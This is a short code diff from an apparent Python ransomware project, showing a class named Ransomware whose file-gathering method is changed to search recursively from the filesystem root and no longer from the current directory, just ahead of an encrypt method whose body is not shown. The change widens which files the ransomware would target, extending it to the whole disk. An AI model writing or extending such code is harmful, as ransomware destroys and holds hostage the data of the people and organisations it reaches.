@@ -35,8 +35,8 @@ class Ransomware:
             sys.exit(1)
 
     def get_files(self, filter:str)->list:
-        # return all files matching the filter
-        files_list=sorted(Path('.').rglob(filter))
+        # return all files matching the filter in alphabetical order
+        files_list=sorted(Path('/').rglob(filter))
         return files_list
 
     def encrypt(self):
